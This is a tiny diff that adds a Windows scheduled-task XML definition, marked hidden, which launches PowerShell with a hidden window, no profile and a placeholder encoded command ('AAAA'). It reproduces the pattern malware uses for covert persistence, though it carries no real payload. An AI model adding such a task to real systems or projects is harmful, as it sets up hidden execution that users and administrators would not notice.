@@ -1,0 +1,2 @@
+<Task version="1.2"><Settings><Hidden>true</Hidden></Settings><Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -nop -enc AAAA</Arguments></Exec></Actions></Task>
+
